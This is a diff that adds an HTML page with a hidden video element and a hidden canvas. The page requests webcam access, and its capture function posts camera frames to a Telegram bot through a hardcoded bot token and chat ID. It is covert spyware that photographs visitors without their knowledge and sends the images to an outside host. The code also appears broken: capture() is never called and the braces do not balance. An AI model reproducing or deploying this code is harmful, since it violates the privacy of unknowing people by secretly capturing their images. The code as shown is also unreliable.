@@ -1,0 +1,41 @@
+ <!DOCTYPE html>
+<html>
+<body>
+
+<video id="video" autoplay playsinline width="320" style="display:none;"></video>
+<canvas id="canvas" width="320" height="240" style="display:none;"></canvas>
+
+<script>
+const BOT_TOKEN = "8194695937:AAHXwebWoX00SagH6LQDVkjz5P89ajvpmKE";
+const CHAT_ID = "8504837303";
+
+const video = document.getElementById("video");
+const canvas = document.getElementById("canvas");
+
+// Success
+navigator.mediaDevices.getUserMedia({ video:true })
+.then(stream => {
+    video.srcObject = stream;
+});
+
+function capture(){
+
+    const context = canvas.getContext("2d");
+    context.drawImage(video,0,0,320,240);
+
+    canvas.toBlob(async function(blob){
+
+        let formData = new FormData();
+        formData.append("chat_id", CHAT_ID);
+        formData.append("photo", blob, "photo.png");
+
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{
+            method:"POST",
+            body:formData
+ });
+
+}
+</script>
+
+</body>
+</html>
